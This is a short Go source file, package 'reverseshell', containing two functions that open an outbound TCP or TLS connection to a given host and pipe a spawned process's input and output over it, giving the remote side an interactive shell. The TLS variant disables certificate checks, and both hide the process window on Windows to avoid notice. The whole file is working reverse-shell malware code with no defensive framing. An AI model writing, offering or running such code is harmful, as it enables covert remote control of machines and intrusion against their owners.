package reverseshell

import (
	"crypto/tls"
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

func ReverseShell(host string, process string) {
	con, err := net.Dial("tcp", host)

	if err != nil {
		fmt.Println(err)
	}

	cmd := exec.Command(process)
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // for hide Windows
	cmd.Run()
}

func ReverseShellSSL(host string, process string) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := tls.Dial("tcp", host, conf)

	if err != nil {
		println(err)
		return
	}

	defer conn.Close()

	cmd := exec.Command(process)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // for hide Windows
	cmd.Run()
}
